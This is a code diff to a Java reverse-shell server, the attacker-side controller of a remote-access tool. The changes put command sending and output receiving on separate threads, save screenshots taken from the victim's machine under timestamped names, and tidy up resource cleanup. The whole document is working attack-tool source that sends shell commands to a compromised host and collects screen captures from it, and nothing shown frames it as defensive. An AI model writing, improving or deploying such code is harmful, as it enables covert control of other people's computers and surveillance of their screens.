@@ -3,6 +3,8 @@ package obs1d1anc1ph3r.reverseshell.server;
 import java.awt.image.BufferedImage;
 import java.io.*;
 import java.net.*;
+import java.text.SimpleDateFormat;
+import java.util.Date;
 import javax.imageio.ImageIO;
 
 public class ReverseShellServer {
@@ -14,6 +16,8 @@ public class ReverseShellServer {
     private PrintWriter out;
     private BufferedReader userInput;
     private DataInputStream dataIn;
+    private Thread outputReceiver;
+    private Thread inputHandler;
 
     public static void main(String[] args) {
         ReverseShellServer server = new ReverseShellServer();
@@ -26,9 +30,11 @@ public class ReverseShellServer {
             waitForConnection();
             setupStreams();
 
-            Thread outputReceiver = new Thread(new ResponseHandler(in));
+            outputReceiver = new Thread(new ResponseHandler(in, out));
             outputReceiver.start();
-            new CommandSender(out, userInput, this).handleShell();
+
+            inputHandler = new Thread(new CommandSender(out, userInput));
+            inputHandler.start();
 
         } catch (IOException e) {
             System.err.println("[ERROR] Server error: " + e.getMessage());
@@ -52,6 +58,7 @@ public class ReverseShellServer {
         in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
         out = new PrintWriter(clientSocket.getOutputStream(), true);
         userInput = new BufferedReader(new InputStreamReader(System.in));
+        dataIn = new DataInputStream(clientSocket.getInputStream());
     }
 
     public void receiveScreenshot() {
@@ -65,7 +72,8 @@ public class ReverseShellServer {
             ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(imageBytes);
             BufferedImage image = ImageIO.read(byteArrayInputStream);
 
-            File outputFile = new File("screenshot.png");
+            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
+            File outputFile = new File("screenshot_" + timestamp + ".png");
             ImageIO.write(image, "png", outputFile);
             System.out.println("[+] Screenshot received and saved as " + outputFile.getAbsolutePath());
 
@@ -80,6 +88,14 @@ public class ReverseShellServer {
 
     private void cleanup() {
         try {
+            if (outputReceiver != null && outputReceiver.isAlive()) {
+                outputReceiver.interrupt();
+            }
+
+            if (inputHandler != null && inputHandler.isAlive()) {
+                inputHandler.interrupt();
+            }
+
             if (in != null) {
                 in.close();
             }
@@ -89,12 +105,16 @@ public class ReverseShellServer {
             if (userInput != null) {
                 userInput.close();
             }
+            if (dataIn != null) {
+                dataIn.close();
+            }
             if (clientSocket != null) {
                 clientSocket.close();
             }
             if (serverSocket != null) {
                 serverSocket.close();
             }
+
         } catch (IOException e) {
             System.err.println("[ERROR] Error closing resources: " + e.getMessage());
         }
